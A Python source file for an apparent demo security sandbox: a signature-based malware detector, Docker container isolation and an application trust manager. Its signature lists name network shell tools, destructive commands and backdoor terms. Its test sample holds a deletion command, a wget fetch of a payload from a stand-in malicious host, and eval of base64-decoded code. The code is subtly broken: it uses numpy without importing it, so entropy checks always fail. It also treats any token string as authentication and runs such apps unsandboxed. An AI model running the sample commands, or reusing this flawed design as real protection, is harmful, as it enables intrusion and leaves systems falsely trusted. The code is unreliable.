"""
SuperInstance Security Sandbox System
Advanced security isolation and monitoring for unverified applications
"""

import docker
import subprocess
import psutil
import os
import json
import time
import threading
import hashlib
import ast
import re
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import logging
import tempfile
from pathlib import Path
import yaml
import requests
import socket

class SecurityThreatLevel(Enum):
    SAFE = "safe"
    LOW_RISK = "low_risk"
    MEDIUM_RISK = "medium_risk"
    HIGH_RISK = "high_risk"
    CRITICAL = "critical"
    MALICIOUS = "malicious"

class ApplicationStatus(Enum):
    UNVERIFIED = "unverified"
    SANDBOXED = "sandboxed"
    AUTHENTICATED = "authenticated"
    MONITORED = "monitored"
    QUARANTINED = "quarantined"
    BLOCKED = "blocked"

class SecurityViolationType(Enum):
    NETWORK_ACCESS = "unauthorized_network_access"
    FILE_SYSTEM = "suspicious_file_access"
    SYSTEM_CALLS = "dangerous_system_calls"
    MEMORY_ABUSE = "excessive_memory_usage"
    CPU_ABUSE = "excessive_cpu_usage"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    MALWARE_SIGNATURE = "malware_signature_detected"
    CODE_INJECTION = "code_injection_attempt"
    DATA_EXFILTRATION = "data_exfiltration_attempt"

@dataclass
class SecurityViolation:
    violation_type: SecurityViolationType
    severity: SecurityThreatLevel
    timestamp: float
    description: str
    evidence: Dict[str, Any]
    app_id: str
    process_id: Optional[int] = None
    network_activity: Optional[Dict[str, Any]] = None

@dataclass
class SandboxConfiguration:
    max_memory_mb: int = 512
    max_cpu_percent: float = 25.0
    max_disk_mb: int = 100
    max_network_connections: int = 0  # 0 = no network access
    allowed_ports: List[int] = field(default_factory=list)
    allowed_domains: List[str] = field(default_factory=list)
    file_system_restrictions: Dict[str, str] = field(default_factory=dict)
    execution_timeout_seconds: int = 3600
    monitoring_interval_seconds: float = 1.0

@dataclass
class ApplicationProfile:
    app_id: str
    name: str
    status: ApplicationStatus
    threat_level: SecurityThreatLevel
    sandbox_config: Optional[SandboxConfiguration]
    violations: List[SecurityViolation] = field(default_factory=list)
    resource_usage: Dict[str, float] = field(default_factory=dict)
    network_activity: List[Dict[str, Any]] = field(default_factory=list)
    code_analysis_results: Dict[str, Any] = field(default_factory=dict)
    authentication_token: Optional[str] = None
    trust_score: float = 0.0

class MalwareDetector:
    """Advanced malware detection using multiple analysis techniques"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Known malware signatures (simplified for demo)
        self.malware_signatures = {
            'suspicious_imports': [
                'subprocess.Popen', 'os.system', 'eval(', 'exec(',
                '__import__', 'importlib', 'socket.socket',
                'urllib.request', 'requests.get', 'base64.decode'
            ],
            'dangerous_functions': [
                'rm -rf', 'delete', 'format', 'mkfs',
                'dd if=', 'chmod 777', 'passwd', 'sudo',
                'nc -l', 'netcat', 'wget', 'curl -o'
            ],
            'crypto_mining': [
                'mining', 'miner', 'hashrate', 'cryptocurrency',
                'bitcoin', 'ethereum', 'monero', 'xmrig'
            ],
            'backdoor_patterns': [
                'reverse_tcp', 'meterpreter', 'payload',
                'bind_tcp', 'shell_reverse', 'backdoor'
            ]
        }
        
        # Entropy thresholds for detecting packed/encrypted code
        self.entropy_threshold = 7.5
        
        self.logger.info("Malware detector initialized")
    
    def analyze_code(self, code_content: str, file_path: str = None) -> Dict[str, Any]:
        """Comprehensive code analysis for malware detection"""
        
        analysis_result = {
            'threat_level': SecurityThreatLevel.SAFE,
            'violations': [],
            'static_analysis': {},
            'behavioral_patterns': {},
            'entropy_analysis': {},
            'confidence_score': 1.0
        }
        
        try:
            # Static analysis
            static_results = self._static_analysis(code_content)
            analysis_result['static_analysis'] = static_results
            
            # Entropy analysis for obfuscation detection
            entropy_results = self._entropy_analysis(code_content)
            analysis_result['entropy_analysis'] = entropy_results
            
            # Behavioral pattern analysis
            behavioral_results = self._behavioral_analysis(code_content)
            analysis_result['behavioral_patterns'] = behavioral_results
            
            # Aggregate threat assessment
            threat_level = self._calculate_threat_level(
                static_results, entropy_results, behavioral_results
            )
            analysis_result['threat_level'] = threat_level
            
            # Generate violations list
            violations = self._generate_violations(
                static_results, entropy_results, behavioral_results
            )
            analysis_result['violations'] = violations
            
        except Exception as e:
            self.logger.error(f"Code analysis failed: {e}")
            analysis_result['threat_level'] = SecurityThreatLevel.MEDIUM_RISK
            analysis_result['confidence_score'] = 0.5
        
        return analysis_result
    
    def _static_analysis(self, code_content: str) -> Dict[str, Any]:
        """Static code analysis for malicious patterns"""
        
        results = {
            'malicious_imports': [],
            'dangerous_functions': [],
            'suspicious_patterns': [],
            'obfuscation_indicators': [],
            'risk_score': 0.0
        }
        
        code_lower = code_content.lower()
        
        # Check for malicious imports
        for category, signatures in self.malware_signatures.items():
            found_signatures = []
            for signature in signatures:
                if signature.lower() in code_lower:
                    found_signatures.append(signature)
                    results['risk_score'] += self._get_signature_risk_score(signature)
            
            if found_signatures:
                results[f'malicious_{category}'] = found_signatures
        
        # Check for obfuscation
        if self._detect_obfuscation(code_content):
            results['obfuscation_indicators'].append('base64_encoding')
            results['risk_score'] += 2.0
        
        if self._detect_code_packing(code_content):
            results['obfuscation_indicators'].append('code_packing')
            results['risk_score'] += 3.0
        
        # Check for suspicious network activity patterns
        network_patterns = self._analyze_network_patterns(code_content)
        results['network_activity'] = network_patterns
        if network_patterns['suspicious_count'] > 0:
            results['risk_score'] += network_patterns['suspicious_count'] * 1.5
        
        return results
    
    def _entropy_analysis(self, code_content: str) -> Dict[str, Any]:
        """Analyze code entropy to detect obfuscation"""
        
        # Calculate entropy of the entire content
        entropy = self._calculate_entropy(code_content)
        
        # Analyze entropy in chunks
        chunk_size = 1000
        chunk_entropies = []
        
        for i in range(0, len(code_content), chunk_size):
            chunk = code_content[i:i + chunk_size]
            if chunk:
                chunk_entropies.append(self._calculate_entropy(chunk))
        
        avg_chunk_entropy = np.mean(chunk_entropies) if chunk_entropies else 0
        max_chunk_entropy = max(chunk_entropies) if chunk_entropies else 0
        
        return {
            'overall_entropy': entropy,
            'average_chunk_entropy': avg_chunk_entropy,
            'max_chunk_entropy': max_chunk_entropy,
            'high_entropy_chunks': len([e for e in chunk_entropies if e > self.entropy_threshold]),
            'obfuscation_likelihood': entropy > self.entropy_threshold
        }
    
    def _behavioral_analysis(self, code_content: str) -> Dict[str, Any]:
        """Analyze behavioral patterns in code"""
        
        results = {
            'file_operations': [],
            'network_operations': [],
            'system_operations': [],
            'privilege_operations': [],
            'persistence_mechanisms': [],
            'evasion_techniques': []
        }
        
        # File operations analysis
        file_patterns = [
            r'open\([\'"][^\'"\n]*[\'"]', r'file\([\'"][^\'"\n]*[\'"]',
            r'os\.remove', r'os\.unlink', r'shutil\.rmtree'
        ]
        
        for pattern in file_patterns:
            matches = re.findall(pattern, code_content, re.IGNORECASE)
            results['file_operations'].extend(matches)
        
        # Network operations analysis
        network_patterns = [
            r'socket\.socket', r'urllib\.request', r'requests\.',
            r'http\.client', r'ftp\.', r'smtp\.'
        ]
        
        for pattern in network_patterns:
            matches = re.findall(pattern, code_content, re.IGNORECASE)
            results['network_operations'].extend(matches)
        
        # System operations analysis
        system_patterns = [
            r'subprocess\.', r'os\.system', r'os\.popen',
            r'os\.spawn', r'commands\.'
        ]
        
        for pattern in system_patterns:
            matches = re.findall(pattern, code_content, re.IGNORECASE)
            results['system_operations'].extend(matches)
        
        return results
    
    def _calculate_entropy(self, data: str) -> float:
        """Calculate Shannon entropy of string data"""
        if not data:
            return 0
        
        # Count frequency of each character
        freq = {}
        for char in data:
            freq[char] = freq.get(char, 0) + 1
        
        # Calculate entropy
        entropy = 0
        length = len(data)
        
        for count in freq.values():
            probability = count / length
            if probability > 0:
                entropy -= probability * np.log2(probability)
        
        return entropy
    
    def _detect_obfuscation(self, code_content: str) -> bool:
        """Detect code obfuscation patterns"""
        
        # Base64 encoding detection
        base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
        base64_matches = re.findall(base64_pattern, code_content)
        
        if len(base64_matches) > 5:  # Threshold for suspicious base64
            return True
        
        # Check for excessive string concatenation (common obfuscation)
        concat_pattern = r'[\'"][^\'"]*[\'"] *\+ *[\'"][^\'"]*[\'"]'
        concat_matches = re.findall(concat_pattern, code_content)
        
        if len(concat_matches) > 10:
            return True
        
        # Check for eval/exec with complex expressions
        eval_pattern = r'(eval|exec)\([^)]{50,}\)'
        if re.search(eval_pattern, code_content, re.IGNORECASE):
            return True
        
        return False
    
    def _detect_code_packing(self, code_content: str) -> bool:
        """Detect packed/compressed code"""
        
        # Check for compression-related imports
        compression_imports = [
            'zlib', 'gzip', 'bz2', 'lzma', 'zipfile'
        ]
        
        for imp in compression_imports:
            if f'import {imp}' in code_content or f'from {imp}' in code_content:
                # Check if it's used for decompression
                if 'decompress' in code_content or 'inflate' in code_content:
                    return True
        
        return False
    
    def _analyze_network_patterns(self, code_content: str) -> Dict[str, Any]:
        """Analyze network-related patterns"""
        
        results = {
            'suspicious_count': 0,
            'external_connections': [],
            'port_operations': [],
            'data_transmission': []
        }
        
        # Check for external IP connections
        ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        ip_matches = re.findall(ip_pattern, code_content)
        
        for ip in ip_matches:
            if not self._is_local_ip(ip):
                results['external_connections'].append(ip)
                results['suspicious_count'] += 1
        
        # Check for port scanning patterns
        port_patterns = [
            r'for.*port.*in.*range', r'socket\.connect.*port',
            r'nc.*-p.*', r'nmap.*-p'
        ]
        
        for pattern in port_patterns:
            if re.search(pattern, code_content, re.IGNORECASE):
                results['port_operations'].append(pattern)
                results['suspicious_count'] += 1
        
        return results
    
    def _is_local_ip(self, ip: str) -> bool:
        """Check if IP address is local/private"""
        import ipaddress
        try:
            addr = ipaddress.ip_address(ip)
            return addr.is_private or addr.is_loopback
        except:
            return False
    
    def _get_signature_risk_score(self, signature: str) -> float:
        """Get risk score for a specific malware signature"""
        
        high_risk_signatures = [
            'eval(', 'exec(', 'os.system', 'subprocess.Popen',
            'rm -rf', 'format', 'dd if='
        ]
        
        medium_risk_signatures = [
            'socket.socket', 'urllib.request', 'base64.decode',
            'chmod', 'passwd'
        ]
        
        if signature in high_risk_signatures:
            return 5.0
        elif signature in medium_risk_signatures:
            return 2.0
        else:
            return 1.0
    
    def _calculate_threat_level(self, static_results: Dict, 
                              entropy_results: Dict, 
                              behavioral_results: Dict) -> SecurityThreatLevel:
        """Calculate overall threat level"""
        
        risk_score = static_results.get('risk_score', 0)
        
        # Add entropy-based risk
        if entropy_results.get('obfuscation_likelihood', False):
            risk_score += 3.0
        
        # Add behavioral risk
        total_operations = (
            len(behavioral_results.get('file_operations', [])) +
            len(behavioral_results.get('network_operations', [])) +
            len(behavioral_results.get('system_operations', []))
        )
        
        if total_operations > 20:
            risk_score += 2.0
        elif total_operations > 10:
            risk_score += 1.0
        
        # Determine threat level
        if risk_score >= 15:
            return SecurityThreatLevel.MALICIOUS
        elif risk_score >= 10:
            return SecurityThreatLevel.CRITICAL
        elif risk_score >= 7:
            return SecurityThreatLevel.HIGH_RISK
        elif risk_score >= 4:
            return SecurityThreatLevel.MEDIUM_RISK
        elif risk_score >= 2:
            return SecurityThreatLevel.LOW_RISK
        else:
            return SecurityThreatLevel.SAFE
    
    def _generate_violations(self, static_results: Dict, 
                           entropy_results: Dict, 
                           behavioral_results: Dict) -> List[SecurityViolation]:
        """Generate list of security violations"""
        
        violations = []
        
        # Static analysis violations
        for malicious_type, signatures in static_results.items():
            if signatures and 'malicious_' in malicious_type:
                for signature in signatures:
                    violations.append(SecurityViolation(
                        violation_type=SecurityViolationType.MALWARE_SIGNATURE,
                        severity=self._get_violation_severity(signature),
                        timestamp=time.time(),
                        description=f"Malicious signature detected: {signature}",
                        evidence={'signature': signature, 'type': malicious_type},
                        app_id="unknown"
                    ))
        
        # Obfuscation violations
        if entropy_results.get('obfuscation_likelihood', False):
            violations.append(SecurityViolation(
                violation_type=SecurityViolationType.CODE_INJECTION,
                severity=SecurityThreatLevel.HIGH_RISK,
                timestamp=time.time(),
                description="Code obfuscation detected",
                evidence=entropy_results,
                app_id="unknown"
            ))
        
        return violations
    
    def _get_violation_severity(self, signature: str) -> SecurityThreatLevel:
        """Get severity level for a violation"""
        
        critical_signatures = ['eval(', 'exec(', 'os.system', 'rm -rf']
        high_risk_signatures = ['subprocess.Popen', 'socket.socket']
        
        if signature in critical_signatures:
            return SecurityThreatLevel.CRITICAL
        elif signature in high_risk_signatures:
            return SecurityThreatLevel.HIGH_RISK
        else:
            return SecurityThreatLevel.MEDIUM_RISK

class SecuritySandbox:
    """Secure execution environment for unverified applications"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.docker_client = None
        self.active_containers = {}
        self.monitoring_threads = {}
        
        # Initialize Docker client
        try:
            self.docker_client = docker.from_env()
            self.logger.info("Docker client initialized")
        except Exception as e:
            self.logger.error(f"Failed to initialize Docker client: {e}")
        
        # Default sandbox configuration
        self.default_config = SandboxConfiguration()
    
    def create_sandbox(self, app_id: str, config: SandboxConfiguration = None) -> str:
        """Create a new sandbox environment"""
        
        if not config:
            config = self.default_config
        
        sandbox_id = f"sandbox_{app_id}_{int(time.time())}"
        
        try:
            # Create Docker container with restrictions
            container = self._create_secure_container(sandbox_id, config)
            
            self.active_containers[app_id] = {
                'container': container,
                'config': config,
                'sandbox_id': sandbox_id,
                'created_at': time.time(),
                'violations': []
            }
            
            self.logger.info(f"Sandbox created for app {app_id}: {sandbox_id}")
            return sandbox_id
            
        except Exception as e:
            self.logger.error(f"Failed to create sandbox for {app_id}: {e}")
            raise
    
    def execute_in_sandbox(self, app_id: str, code_path: str, 
                          args: List[str] = None) -> Dict[str, Any]:
        """Execute code in sandbox with monitoring"""
        
        if app_id not in self.active_containers:
            raise ValueError(f"No sandbox found for app {app_id}")
        
        container_info = self.active_containers[app_id]
        container = container_info['container']
        config = container_info['config']
        
        try:
            # Start monitoring
            monitor_thread = threading.Thread(
                target=self._monitor_sandbox,
                args=(app_id, container, config)
            )
            monitor_thread.daemon = True
            monitor_thread.start()
            self.monitoring_threads[app_id] = monitor_thread
            
            # Execute code
            result = container.exec_run(
                cmd=self._build_execution_command(code_path, args),
                detach=False,
                stdout=True,
                stderr=True
            )
            
            execution_result = {
                'exit_code': result.exit_code,
                'stdout': result.output.decode('utf-8') if result.output else '',
                'stderr': '',  # Separate stderr if needed
                'violations': container_info['violations'],
                'resource_usage': self._get_resource_usage(container),
                'execution_time': time.time() - container_info['created_at']
            }
            
            self.logger.info(f"Code execution completed for {app_id}")
            return execution_result
            
        except Exception as e:
            self.logger.error(f"Sandbox execution failed for {app_id}: {e}")
            raise
    
    def destroy_sandbox(self, app_id: str):
        """Destroy sandbox and cleanup resources"""
        
        if app_id not in self.active_containers:
            return
        
        try:
            container_info = self.active_containers[app_id]
            container = container_info['container']
            
            # Stop monitoring
            if app_id in self.monitoring_threads:
                # Note: In production, implement proper thread stopping
                del self.monitoring_threads[app_id]
            
            # Stop and remove container
            container.stop()
            container.remove()
            
            del self.active_containers[app_id]
            
            self.logger.info(f"Sandbox destroyed for app {app_id}")
            
        except Exception as e:
            self.logger.error(f"Failed to destroy sandbox for {app_id}: {e}")
    
    def _create_secure_container(self, sandbox_id: str, 
                                config: SandboxConfiguration) -> Any:
        """Create secure Docker container with restrictions"""
        
        # Container configuration with security restrictions
        container_config = {
            'image': 'python:3.9-slim',  # Use minimal Python image
            'name': sandbox_id,
            'detach': True,
            'network_disabled': config.max_network_connections == 0,
            'mem_limit': f"{config.max_memory_mb}m",
            'cpu_quota': int(100000 * (config.max_cpu_percent / 100)),
            'cpu_period': 100000,
            'security_opt': ['no-new-privileges:true'],
            'cap_drop': ['ALL'],  # Drop all capabilities
            'cap_add': ['SETGID', 'SETUID'],  # Only add necessary capabilities
            'read_only': True,  # Read-only root filesystem
            'tmpfs': {'/tmp': 'size=50m,noexec'},  # Temporary filesystem
            'ulimits': [
                docker.types.Ulimit(name='nproc', soft=10, hard=10),  # Max processes
                docker.types.Ulimit(name='fsize', soft=10485760, hard=10485760)  # Max file size
            ],
            'environment': {
                'PYTHONPATH': '/app',
                'PYTHONDONTWRITEBYTECODE': '1'
            },
            'working_dir': '/app'
        }
        
        # Create and start container
        container = self.docker_client.containers.run(**container_config)
        
        return container
    
    def _monitor_sandbox(self, app_id: str, container: Any, 
                        config: SandboxConfiguration):
        """Monitor sandbox for violations"""
        
        start_time = time.time()
        
        while (time.time() - start_time) < config.execution_timeout_seconds:
            try:
                # Check resource usage
                stats = container.stats(stream=False)
                
                # Memory check
                memory_usage = self._get_memory_usage_mb(stats)
                if memory_usage > config.max_memory_mb:
                    self._record_violation(app_id, SecurityViolationType.MEMORY_ABUSE,
                                         f"Memory usage {memory_usage}MB exceeds limit {config.max_memory_mb}MB")
                
                # CPU check
                cpu_usage = self._get_cpu_usage_percent(stats)
                if cpu_usage > config.max_cpu_percent:
                    self._record_violation(app_id, SecurityViolationType.CPU_ABUSE,
                                         f"CPU usage {cpu_usage:.1f}% exceeds limit {config.max_cpu_percent}%")
                
                # Network monitoring (if enabled)
                if config.max_network_connections > 0:
                    network_stats = self._get_network_stats(stats)
                    # Implement network monitoring logic
                
                time.sleep(config.monitoring_interval_seconds)
                
            except Exception as e:
                self.logger.warning(f"Monitoring error for {app_id}: {e}")
                break
    
    def _record_violation(self, app_id: str, violation_type: SecurityViolationType, 
                         description: str):
        """Record a security violation"""
        
        violation = SecurityViolation(
            violation_type=violation_type,
            severity=SecurityThreatLevel.HIGH_RISK,
            timestamp=time.time(),
            description=description,
            evidence={},
            app_id=app_id
        )
        
        if app_id in self.active_containers:
            self.active_containers[app_id]['violations'].append(violation)
        
        self.logger.warning(f"Security violation in {app_id}: {description}")
    
    def _get_memory_usage_mb(self, stats: Dict) -> float:
        """Extract memory usage from Docker stats"""
        try:
            memory_stats = stats['memory_stats']
            return memory_stats['usage'] / (1024 * 1024)  # Convert to MB
        except:
            return 0.0
    
    def _get_cpu_usage_percent(self, stats: Dict) -> float:
        """Extract CPU usage percentage from Docker stats"""
        try:
            cpu_stats = stats['cpu_stats']
            precpu_stats = stats['precpu_stats']
            
            cpu_delta = cpu_stats['cpu_usage']['total_usage'] - precpu_stats['cpu_usage']['total_usage']
            system_delta = cpu_stats['system_cpu_usage'] - precpu_stats['system_cpu_usage']
            
            if system_delta > 0:
                return (cpu_delta / system_delta) * len(cpu_stats['cpu_usage']['percpu_usage']) * 100
            
        except:
            pass
        
        return 0.0
    
    def _get_network_stats(self, stats: Dict) -> Dict[str, Any]:
        """Extract network statistics from Docker stats"""
        try:
            return stats.get('networks', {})
        except:
            return {}
    
    def _get_resource_usage(self, container: Any) -> Dict[str, float]:
        """Get current resource usage of container"""
        try:
            stats = container.stats(stream=False)
            return {
                'memory_mb': self._get_memory_usage_mb(stats),
                'cpu_percent': self._get_cpu_usage_percent(stats)
            }
        except:
            return {'memory_mb': 0, 'cpu_percent': 0}
    
    def _build_execution_command(self, code_path: str, args: List[str] = None) -> List[str]:
        """Build command for code execution in sandbox"""
        
        cmd = ['python3', code_path]
        
        if args:
            cmd.extend(args)
        
        return cmd

class SuperInstanceSecurityManager:
    """Main security management system"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Initialize components
        self.malware_detector = MalwareDetector()
        self.sandbox = SecuritySandbox()
        
        # Application registry
        self.applications = {}  # app_id -> ApplicationProfile
        
        # Security policies
        self.security_policies = self._load_security_policies()
        
        self.logger.info("SuperInstance Security Manager initialized")
    
    def register_application(self, app_id: str, name: str, 
                           code_content: str = None,
                           authentication_token: str = None) -> ApplicationProfile:
        """Register a new application with security assessment"""
        
        self.logger.info(f"Registering application: {app_id}")
        
        # Determine application status
        if authentication_token:
            status = ApplicationStatus.AUTHENTICATED
        else:
            status = ApplicationStatus.UNVERIFIED
        
        # Create application profile
        profile = ApplicationProfile(
            app_id=app_id,
            name=name,
            status=status,
            threat_level=SecurityThreatLevel.SAFE,
            sandbox_config=None,
            authentication_token=authentication_token
        )
        
        # Analyze code if provided
        if code_content:
            analysis_result = self.malware_detector.analyze_code(code_content)
            profile.code_analysis_results = analysis_result
            profile.threat_level = analysis_result['threat_level']
            profile.violations.extend(analysis_result['violations'])
            
            # Update trust score
            profile.trust_score = self._calculate_trust_score(profile)
        
        # Configure security measures
        if status == ApplicationStatus.UNVERIFIED:
            profile.sandbox_config = self._create_sandbox_config(profile)
            profile.status = ApplicationStatus.SANDBOXED
        
        self.applications[app_id] = profile
        
        self.logger.info(f"Application {app_id} registered with status: {status.value}, "
                        f"threat level: {profile.threat_level.value}")
        
        return profile
    
    def execute_application(self, app_id: str, code_path: str, 
                          args: List[str] = None) -> Dict[str, Any]:
        """Execute application with appropriate security measures"""
        
        if app_id not in self.applications:
            raise ValueError(f"Application {app_id} not registered")
        
        profile = self.applications[app_id]
        
        if profile.status == ApplicationStatus.BLOCKED:
            raise SecurityError(f"Application {app_id} is blocked due to security violations")
        
        if profile.status in [ApplicationStatus.SANDBOXED, ApplicationStatus.UNVERIFIED]:
            # Execute in sandbox
            self.logger.info(f"Executing {app_id} in sandbox")
            
            sandbox_id = self.sandbox.create_sandbox(app_id, profile.sandbox_config)
            
            try:
                result = self.sandbox.execute_in_sandbox(app_id, code_path, args)
                
                # Update profile with execution results
                profile.violations.extend(result['violations'])
                profile.resource_usage = result['resource_usage']
                
                # Reassess threat level
                self._reassess_threat_level(profile)
                
                return result
                
            finally:
                self.sandbox.destroy_sandbox(app_id)
        
        elif profile.status == ApplicationStatus.AUTHENTICATED:
            # Execute with monitoring (implemented in separate module)
            self.logger.info(f"Executing authenticated {app_id} with monitoring")
            return self._execute_with_monitoring(app_id, code_path, args)
        
        else:
            raise SecurityError(f"Cannot execute application with status: {profile.status.value}")
    
    def update_application_status(self, app_id: str, new_status: ApplicationStatus,
                                authentication_token: str = None):
        """Update application security status"""
        
        if app_id not in self.applications:
            raise ValueError(f"Application {app_id} not found")
        
        profile = self.applications[app_id]
        old_status = profile.status
        
        profile.status = new_status
        
        if authentication_token:
            profile.authentication_token = authentication_token
        
        # Reconfigure security measures if needed
        if new_status == ApplicationStatus.SANDBOXED and not profile.sandbox_config:
            profile.sandbox_config = self._create_sandbox_config(profile)
        
        self.logger.info(f"Application {app_id} status updated: {old_status.value} -> {new_status.value}")
    
    def get_security_report(self, app_id: str) -> Dict[str, Any]:
        """Generate comprehensive security report for application"""
        
        if app_id not in self.applications:
            raise ValueError(f"Application {app_id} not found")
        
        profile = self.applications[app_id]
        
        return {
            'app_id': app_id,
            'name': profile.name,
            'status': profile.status.value,
            'threat_level': profile.threat_level.value,
            'trust_score': profile.trust_score,
            'total_violations': len(profile.violations),
            'violation_summary': self._summarize_violations(profile.violations),
            'code_analysis': profile.code_analysis_results,
            'resource_usage': profile.resource_usage,
            'recommendations': self._generate_security_recommendations(profile),
            'last_updated': time.time()
        }
    
    def _calculate_trust_score(self, profile: ApplicationProfile) -> float:
        """Calculate trust score for application (0.0 to 1.0)"""
        
        base_score = 1.0
        
        # Reduce score based on threat level
        threat_penalties = {
            SecurityThreatLevel.SAFE: 0.0,
            SecurityThreatLevel.LOW_RISK: 0.1,
            SecurityThreatLevel.MEDIUM_RISK: 0.3,
            SecurityThreatLevel.HIGH_RISK: 0.5,
            SecurityThreatLevel.CRITICAL: 0.7,
            SecurityThreatLevel.MALICIOUS: 0.9
        }
        
        base_score -= threat_penalties.get(profile.threat_level, 0.5)
        
        # Reduce score based on violations
        violation_penalty = min(len(profile.violations) * 0.05, 0.3)
        base_score -= violation_penalty
        
        # Bonus for authentication
        if profile.status == ApplicationStatus.AUTHENTICATED:
            base_score += 0.2
        
        return max(0.0, min(1.0, base_score))
    
    def _create_sandbox_config(self, profile: ApplicationProfile) -> SandboxConfiguration:
        """Create sandbox configuration based on threat assessment"""
        
        config = SandboxConfiguration()
        
        # Adjust limits based on threat level
        if profile.threat_level in [SecurityThreatLevel.HIGH_RISK, SecurityThreatLevel.CRITICAL]:
            config.max_memory_mb = 256
            config.max_cpu_percent = 15.0
            config.max_disk_mb = 50
            config.execution_timeout_seconds = 1800  # 30 minutes
        elif profile.threat_level == SecurityThreatLevel.MEDIUM_RISK:
            config.max_memory_mb = 384
            config.max_cpu_percent = 20.0
            config.max_disk_mb = 75
        # Use defaults for low risk and safe applications
        
        return config
    
    def _reassess_threat_level(self, profile: ApplicationProfile):
        """Reassess threat level based on runtime behavior"""
        
        # Count recent violations
        recent_violations = [v for v in profile.violations 
                           if time.time() - v.timestamp < 3600]  # Last hour
        
        if len(recent_violations) >= 5:
            profile.threat_level = SecurityThreatLevel.HIGH_RISK
        elif len(recent_violations) >= 3:
            profile.threat_level = SecurityThreatLevel.MEDIUM_RISK
        
        # Update trust score
        profile.trust_score = self._calculate_trust_score(profile)
        
        # Block application if threat level is too high
        if profile.threat_level == SecurityThreatLevel.MALICIOUS:
            profile.status = ApplicationStatus.BLOCKED
    
    def _execute_with_monitoring(self, app_id: str, code_path: str, 
                               args: List[str] = None) -> Dict[str, Any]:
        """Execute authenticated application with monitoring"""
        
        # This would integrate with the in-house monitoring bot system
        # For now, return a simplified implementation
        
        self.logger.info(f"Executing {app_id} with in-house bot monitoring")
        
        try:
            # Execute the application normally
            import subprocess
            result = subprocess.run(
                ['python3', code_path] + (args or []),
                capture_output=True,
                text=True,
                timeout=3600
            )
            
            return {
                'exit_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'violations': [],  # Monitoring bot would populate this
                'improvements_applied': [],  # Bot improvements would be listed here
                'execution_time': 0  # Would be measured
            }
            
        except subprocess.TimeoutExpired:
            raise SecurityError("Application execution timeout")
        except Exception as e:
            raise SecurityError(f"Application execution failed: {e}")
    
    def _summarize_violations(self, violations: List[SecurityViolation]) -> Dict[str, int]:
        """Summarize violations by type"""
        summary = {}
        
        for violation in violations:
            vtype = violation.violation_type.value
            summary[vtype] = summary.get(vtype, 0) + 1
        
        return summary
    
    def _generate_security_recommendations(self, profile: ApplicationProfile) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if profile.threat_level in [SecurityThreatLevel.HIGH_RISK, SecurityThreatLevel.CRITICAL]:
            recommendations.append("Consider code review and security audit")
            recommendations.append("Implement additional access controls")
        
        if len(profile.violations) > 5:
            recommendations.append("Review and address security violations")
        
        if profile.trust_score < 0.5:
            recommendations.append("Consider authentication to improve trust score")
        
        if profile.status == ApplicationStatus.UNVERIFIED:
            recommendations.append("Authenticate application to access full features")
        
        return recommendations
    
    def _load_security_policies(self) -> Dict[str, Any]:
        """Load security policies configuration"""
        return {
            'max_violations_per_hour': 10,
            'auto_block_threshold': SecurityThreatLevel.CRITICAL,
            'sandbox_timeout_hours': 1,
            'trust_score_threshold': 0.3
        }

class SecurityError(Exception):
    """Custom security-related exception"""
    pass

# Example usage and testing
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    # Initialize security manager
    security_manager = SuperInstanceSecurityManager()
    
    # Test malware detection
    suspicious_code = '''
import subprocess
import os
import base64

def suspicious_function():
    os.system("rm -rf /tmp/*")
    subprocess.Popen("wget http://malicious-site.com/payload", shell=True)
    eval(base64.b64decode("cHJpbnQoJ21hbGljaW91cycpCg=="))
'''
    
    # Register suspicious application
    profile = security_manager.register_application(
        app_id="test_suspicious_app",
        name="Suspicious Test App",
        code_content=suspicious_code
    )
    
    print(f"Application registered with threat level: {profile.threat_level.value}")
    print(f"Trust score: {profile.trust_score:.2f}")
    print(f"Status: {profile.status.value}")
    print(f"Violations detected: {len(profile.violations)}")
    
    # Generate security report
    report = security_manager.get_security_report("test_suspicious_app")
    print(f"\nSecurity Report:")
    print(f"Threat Level: {report['threat_level']}")
    print(f"Trust Score: {report['trust_score']:.2f}")
    print(f"Violations: {report['violation_summary']}")
    print(f"Recommendations: {report['recommendations']}")
    
    # Test with authenticated application
    safe_code = '''
print("Hello, SuperInstance!")
for i in range(10):
    print(f"Safe operation {i}")
'''
    
    auth_profile = security_manager.register_application(
        app_id="test_authenticated_app",
        name="Authenticated Test App",
        code_content=safe_code,
        authentication_token="valid_token_123"
    )
    
    print(f"\nAuthenticated app threat level: {auth_profile.threat_level.value}")
    print(f"Authenticated app status: {auth_profile.status.value}")
    print(f"Authenticated app trust score: {auth_profile.trust_score:.2f}")